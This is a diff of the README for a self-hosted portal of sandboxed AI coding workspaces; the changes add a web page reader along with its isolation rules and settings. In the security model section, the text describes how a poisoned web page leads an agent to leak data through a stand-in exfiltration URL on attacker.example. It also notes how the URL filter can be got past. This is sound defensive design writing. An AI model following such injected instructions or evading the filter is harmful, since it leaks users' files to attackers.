@@ -2,8 +2,8 @@
 
 A private web portal that gives every user their own AI coding workspace: a container running the agent
 they choose, the [Qwen Code](https://github.com/QwenLM/qwen-code) Web Shell (`qwen serve`) or the
-DeepSeek Harness web UI (`dsh`), with a shell, files, a headless browser and web search, all driven by a
-model you host.
+DeepSeek Harness web UI (`dsh`), with a shell, files, a headless browser, web search and a page reader, all
+driven by a model you host.
 
 - Username/password sign-in. One admin creates the users (first, middle and last name).
 - **One container per user**, shared by all of that user's sign-ins (two browsers, two devices: same workspace).
@@ -13,9 +13,9 @@ model you host.
   never while the agent is working**. A long task keeps running after the user leaves, and the workspace stops
   once the task is done.
 - The admin sees every workspace's state and can open any of them, even while the user is in it.
-- **Locked down by default:** a workspace can reach exactly two things, the model provider and the search
-  engine, and only through the portal's gateway. It has no internet access, can't reach your LAN or other
-  workspaces, and has nothing mounted except the user's own files.
+- **Locked down by default:** a workspace can reach one address, the portal's gateway, which gives it the
+  model, web search and a reader for public web pages. It has no internet access of its own, can't reach
+  your LAN or other workspaces, and has nothing mounted except the user's own files.
 
 ```
  browser ──:3000──▶ web (Next.js)  ── sign-in, admin console, starts/stops workspaces
@@ -24,7 +24,8 @@ model you host.
                         ▲                              │
                         └─ 172.29.0.1:4001 ◀───────────┘ the only address a workspace can reach
                                ├─ /llm/v1    ──▶ LLM_UPSTREAM_URL (your model server)
-                               └─ /mcp/search ─▶ SEARXNG_URL       (your SearXNG)
+                               └─ /mcp/search ─┬▶ SEARXNG_URL      (your SearXNG: web_search)
+                                               └▶ reader container (public web pages: read_page)
 ```
 
 ## Contents
@@ -34,6 +35,7 @@ model you host.
 - [Install and start the web server](#install-and-start-the-web-server)
 - [Connect the model](#connect-the-model)
 - [Connect your SearXNG search engine](#connect-your-searxng-search-engine)
+- [The page reader](#the-page-reader)
 - [The agents: Qwen Code and DeepSeek Harness](#the-agents-qwen-code-and-deepseek-harness)
 - [Agent settings for all workspaces](#agent-settings-for-all-workspaces)
 - [Updating the workspace images](#updating-the-workspace-images)
@@ -49,7 +51,7 @@ model you host.
 Each item is enforced by the gateway or the host, not by the agent. `deploy/verify-isolation.sh` checks the
 network and container items on a live install.
 
-**Network: two destinations, nothing else**
+**Network: one address, three services**
 - Workspaces sit on a Docker *internal* network: Docker gives it no route off the host. There is no DNS for
   internet names, no NAT and no IPv6.
 - Inter-container traffic is disabled, so a workspace can't reach another workspace.
@@ -63,9 +65,26 @@ network and container items on a live install.
   - the model: chat completions, completions, embeddings and the model list under `/llm/v1/`, forwarded to
     `LLM_UPSTREAM_URL` with your real API key added (any other path of the model server is refused);
   - web search: an MCP `web_search` tool that sends the query to `SEARXNG_URL` and returns titles, links and
-    snippets.
+    snippets;
+  - page reading: an MCP `read_page` tool that returns the text of one public web page or PDF.
 
-  There is no URL-fetch tool and no proxy, so nothing else on the internet is reachable.
+  There is no proxy: the workspace never holds a connection to the internet. `read_page` is the one way
+  something an agent names is fetched, so it is fenced in twice:
+  - The gateway decides *which* pages. By default an agent may open a URL it was shown (in its search
+    results, on a page it read, or in its conversation: what you typed and what its tools printed) and
+    anything on a short list of documentation and code sites. A URL the model put together itself is
+    refused, and so is anything it adds to a URL it was shown: the page is requested exactly as it was
+    shown. That is the usual way a poisoned page gets an agent to leak data: "open
+    `https://attacker.example/?d=<your file>`". This is a filter, not a wall: an agent that is talked into
+    printing such a URL through a tool and then opening it gets past it. `READER_URL_POLICY=any` turns the
+    rule off.
+  - The reader decides *where* it connects, and this part is a wall. It is a container of its own with no
+    secrets, volumes or capabilities. It reads only `http`/`https` on ports 80 and 443 at public IPv4
+    addresses, connects to the very address it checked (so a name can't change between the check and the
+    connection), checks every redirect the same way, sends no cookies, and caps time, size and output. The
+    host firewall enforces the same from outside: from the reader's network only public addresses on 80
+    and 443 and its two DNS servers are reachable, so not the host, your LAN, the LLM server, a metadata
+    address or a workspace.
 - The agents' own internet features are off, and users can't turn them back on:
   - Qwen Code, pinned at system scope: auto-update, usage statistics, telemetry and the model catalogue
     refresh are off, `web_fetch` is denied, and the built-in web search providers are removed.
@@ -98,8 +117,8 @@ network and container items on a live install.
 
 **Credentials**
 - The LLM API key and SearXNG credentials stay in the gateway; a workspace sees a placeholder key. Each of
-  the two portal containers gets only the settings it uses: the web app never sees those credentials, and
-  the gateway never sees the admin password.
+  the portal's containers gets only the settings it uses: the web app never sees those credentials, the
+  gateway never sees the admin password, and the page reader gets no secret at all.
 - Each container start gets a fresh random credential for its agent. It lives only in the gateway and in
   that container.
   - Qwen Code: the browser gets a different token, derived from its portal session and that one workspace.
@@ -270,6 +289,51 @@ Only the query text, page, time range and language are sent to SearXNG. The work
 directly. The gateway's `limiter` setting in SearXNG (if you use its bot protection) sees the gateway's
 address, so allow it there.
 
+Three settings make searches hold up when engines misbehave:
+
+```sh
+SEARCH_FALLBACK_ENGINES=duckduckgo,mojeek      # asked by name when a search finds fewer than SEARCH_FALLBACK_BELOW results
+SEARCH_FALLBACK_BELOW=3
+SEARCH_CACHE_MINUTES=15                        # the same search again is answered from memory
+```
+
+- Fallback engines can be engines SearXNG has loaded but keeps out of ordinary searches (`disabled: true`
+  in its `settings.yml`). That way a spare engine is only asked when the main ones come back thin, and is
+  not worn out (and blocked) by every query.
+- When every engine fails, the agent is told which ones did not answer and that rewording will not help.
+  Without that, a model takes "no results" as a bad query and retries it in ten spellings.
+- SearXNG skips, without an error, every engine that has no paging when asked for page 2, and every engine
+  that has no date filter when asked for one. Keep at least one engine with both among the ones that are
+  always on, or those searches come back empty.
+
+## The page reader
+
+`read_page` gives an agent the text of a public web page or PDF as markdown: the main content, without
+menus and ads, with code blocks kept exactly as written. Long pages come in parts (20,000 characters by
+default) and the agent asks for the next part when it wants more. The reader has no browser, so a page
+that only appears with JavaScript, or a site that turns automated readers away, can't be read.
+
+It runs as the `reader` container, started with the rest of the stack. Settings, all in `.env`:
+
+```sh
+#READER_URL=off                 # no read_page tool; agents get web_search only
+READER_URL_POLICY=shown         # shown: only pages the agent was shown, plus trusted sites. any: every public page
+#READER_TRUSTED_HOSTS=...       # sites open as a whole (subdomains included); default: a list of docs and code sites
+READER_PAGE_CHARS=20000         # characters per call
+READER_CACHE_MINUTES=15         # a page read again, or read on, is not downloaded again
+READER_DNS_1=1.1.1.1            # the reader's DNS servers; must be public ones
+READER_DNS_2=9.9.9.9
+```
+
+`.env.example` lists the rest (limits, port, network). After changing the network or DNS settings re-run
+`sudo bash deploy/install.sh`, because the firewall is generated from them; for the others
+`docker compose up -d` is enough.
+
+What leaves your server when an agent reads a page: one GET request to that site from your public address,
+with the user agent `WorkspacePortalReader`, and a DNS lookup of its name at the two DNS servers above.
+The security model above explains how the reader is confined; `sudo bash deploy/verify-isolation.sh`
+checks it on the live install.
+
 ## The agents: Qwen Code and DeepSeek Harness
 
 `WORKSPACE_AGENTS` in `.env` lists the agents users choose from, in the order they are shown:
@@ -321,7 +385,7 @@ portal and in `docker compose logs gateway`.
 
 **What the portal always enforces** on top of your files, because the isolation depends on it:
 
-- `mcpServers.search`: the portal's web search. With `WORKSPACE_BROWSER=true`, also `mcpServers.browser`
+- `mcpServers.search`: the portal's web search and page reader. With `WORKSPACE_BROWSER=true`, also `mcpServers.browser`
   (headless Chromium inside the workspace). Your other MCP servers are kept. Stdio servers run inside the
   workspace; HTTP servers elsewhere are unreachable.
 - `modelProviders.openai[*].baseUrl` goes to the gateway, `envKey` to a placeholder, and `apiKey` is removed.
@@ -329,7 +393,8 @@ portal and in `docker compose logs gateway`.
 - `security.auth.enforcedType` and `selectedType`: `openai`.
 - Off: `general.enableAutoUpdate`, `general.preventSystemSleep`, `privacy.usageStatisticsEnabled`,
   `telemetry.enabled`, `model.catalogRefresh`.
-- `permissions.deny` includes `web_fetch`, and `tools.webSearch` (built-in providers) is removed.
+- `permissions.deny` includes `web_fetch` (Qwen Code's own fetch tool, which would need internet access;
+  pages are read with the portal's `read_page`), and `tools.webSearch` (built-in providers) is removed.
 
 Users keep their own Qwen Code settings, chats and memory in their home directory, which survives restarts.
 
@@ -404,7 +469,8 @@ Remove old images when you no longer need them, in the admin console or with
 `sudo docker image rm workspace-portal/workspace:qwen-0.27.0`.
 
 Check the release notes before upgrading:
-- Qwen Code: the gateway relies on `qwen serve`'s token auth and `/health?deep=1`.
+- Qwen Code: the gateway relies on `qwen serve`'s token auth, `/health?deep=1` and the
+  `daemon.startup.preheat.status` field of `/daemon/status`.
 - DeepSeek Harness: the gateway relies on its login cookie format and its `session/list`, `session/state`
   and `job/list` API. The image build checks the rest: it fails, and the current version stays, if a row of
   `workspace-image/dsh/lockdown.patch.yml` doesn't exist in the new version or its agent presets can't be
@@ -510,7 +576,9 @@ npm run dev -w @portal/web       # http://localhost:3000; web/test/mock-gateway.
 
 Layout:
 - `web/` is the Next.js portal.
-- `gateway/` holds the workspace manager, proxies, LLM queue and search MCP.
+- `gateway/` holds the workspace manager, proxies, LLM queue and the MCP server for search and page reading.
+- `reader/` is the page reader container: fetching and address checks in Python, HTML to markdown with
+  Defuddle in Node.
 - `packages/db/` is the SQLite schema shared by both.
 - `workspace-image/` builds the workspace images: one Dockerfile with a target per agent, the start scripts,
   and DeepSeek Harness's lockdown patch with its build-time preset adaptation and check.
@@ -528,6 +596,8 @@ Layout:
   `AGENT_PORT_COUNT` (and re-run the installer to open the ports) for more.
 - The admin can see everything in every workspace.
 - Plain HTTP on the LAN: use Tailscale (above) or a VPN when you leave it.
+- The page reader runs no JavaScript and does not pretend to be a browser: pages built in the browser and
+  sites that block automated readers come back as a refusal, and the agent has to use another source.
 - The LLM queue is per gateway process. Usage is counted per user per day in `llm_usage`, but not shown in the
   UI yet.
 - DeepSeek Harness uses the model server's default sampling parameters (temperature, top-p, …), whatever
